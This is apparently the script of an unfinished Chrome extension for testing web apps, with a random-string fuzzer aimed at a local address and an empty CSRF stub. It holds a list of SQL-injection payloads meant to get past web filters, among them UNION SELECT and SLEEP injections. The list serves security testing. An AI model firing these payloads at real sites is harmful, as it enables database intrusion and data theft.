function newTab(){
    chrome.tabs.create({'url': "https://google.com"});
}

function newWindow(){
    chrome.windows.create({'url': "https://google.com"});
}

function upArrow(){
    var n = localStorage.getItem('counter');
    n++;
    localStorage.setItem('counter', n);
    document.getElementById('counter').innerHTML = n;

}

function downArrow(){
    var n = localStorage.getItem('counter', n);
    n--;
    localStorage.setItem('counter',n);
    document.getElementById('counter').innerHTML = n;
}

function changeBackgroundColor() {
    var hex = document.getElementById('hexVal').value;
    if (hex.length > 6) {
        return;
    }
    var script = 'document.body.style.backgroundColor="#' + hex + '";';
    chrome.tabs.executeScript(null,
    {code: script});
}
///////////////////////----------------------------------///////////////////////
///////////////////////----------------------------------///////////////////////
///////////////////////----------------------------------///////////////////////

//------------------------------------------------------------------------------
//-----------------------Helper Functions For The Tests-------------------------
//------------------------------------------------------------------------------


//generates a single random charcter
function randomChar(){
    var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz=+-_)(*&^%$#@!~<,>.?:;[]{}";
    var r = Math.floor(Math.random() * chars.length);
    return chars.substring(r,r+1);
}

//------------------------------------------------------------------------------
function createString(len){
    var s = '';
    for (var i=0; i<len; i++){
        s = s.concat(randomChar());
    }
    return s;
}

//------------------------------------------------------------------------------
function fillForm(s){
    //TODO
    //find the submit/search bar and fill it out
    chrome.tabs.executeScript(null,
    {
        code:"document.forms[0]['q'].value=".concat(s)
    });

}
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------
//--------------------The Various Tests Functions-------------------------------
//------------------------------------------------------------------------------
function startSQL(iterCount){
    //TODO: the whole thing

    var sqlDatabase = [
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871', // apostrophemask
    '1 AND %00%271%00%27=%00%271', //apostrophenullencode
    '1 AND 1=1%00', // appendnullbyte
    'MScgQU5EIFNMRUVQKDUpIw==', // base64encode
    '1 AND A BETWEEN B AND B--', //between
    'SELECT%09id FROM%09users WHERE%09id LIKE 1', // bluecoat
    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545', //chardoubleencode
    '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45', //charencode
    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045', //charunicodeescape
    'LIMIT 3 OFFSET 2',//commaLessLimit
    'MID(VERSION() FROM 1 FOR 1)',//commalessmid
    'SELECT ABS/**/(1)', //commalessparenthesis
    'CONCAT_WS(MID(CHAR(0),0,0),1,2)', //concat2concatws
    'SELECT * FROM users WHERE id LIKE 1',
    '1\\\\" AND SLEEP(5)#', //escape quotes
    '1 AND GREATEST(A,B+1)=A', //greatest
    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa", //halfversionedmorekeywords
    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;', //htmlencode
    'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END', //ifnull2casewhenisnull
    'IF(ISNULL(1),2,1)', //ifnull2ifisnull
    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES', //informationschemacomment
    '1 AND LEAST(A,B+1)=B+1', //least
    'insert', //lowercase
    '1 /*!30874AND 2>1*/--', //modsecurityversioned
    '1 UNIOUNIONN SELESELECTCT 2--', //nonrecursivereplacement
]


    var site = "http://192.168.1.29/?s="
    var test = site.concat()
    for (var i=0; i<iterCount; i++){
        //shit

    }

}

//------------------------------------------------------------------------------
function startCSRF(){
    //TODO: the whole thing nams stuff here

}

//------------------------------------------------------------------------------
function startFuzzing(fuzLen, iterCount){


    // chrome.tabs.query({
    // active: true,
    // currentWindow: true
    // }, function(tabs) {
    //     var tabURL = tabs[0].url;
    //     console.log(tabURL);
    // });

    var site = "http://192.168.1.29/?s=" // search term will be appended
    var test = site.concat(createString(fuzLen));

    for (let i = 0; i < iterCount; i++) {
        chrome.tabs.create({'url': test}); // right now website is hardcoded...
        test = site.concat(createString(fuzLen));
    }
}


//---------------------------End of Test Functions------------------------------
//------------------------------------------------------------------------------

// runs the test based on radio buttons
function startTest(){
    console.log("lsdjfkldsjdjf");

    var len = Number(document.getElementById('injectLen').value);
    //checking value of setLen
    if((len >= 1000) || (len <= 0)){
        //TODO: the alert closes instantly
        alert("enter a valid value for the string Length")
    }

    var iterations = Number(document.getElementById('iterCount').value);
    //checking value of iterCount
    if((iterations >= 1000) || (iterations <= 0)){
        //TODO: the alert closes instantly
        alert("enter a valid value for the number of iterations")
    }

    //check which radio button is selected
    if(document.getElementById('selectSQL').checked){
        startSQL(iterations);
    }
    else if(document.getElementById('selectCSRF').checked){
        startCSRF();
    }
    else if(document.getElementById('selectFuzzing').checked){
        startFuzzing(len,iterations);
    }

}


// document.getElementById('setColor').addEventListener('click',changeBackgroundColor);
document.getElementById('startTest').addEventListener('click',startTest);

// document.getElementById('new_tab').addEventListener('click',newTab);
// document.getElementById('new_window').addEventListener('click',newWindow);

// document.getElementById('up_arrow').addEventListener('click',upArrow);
// document.getElementById('down_arrow').addEventListener('click',downArrow);


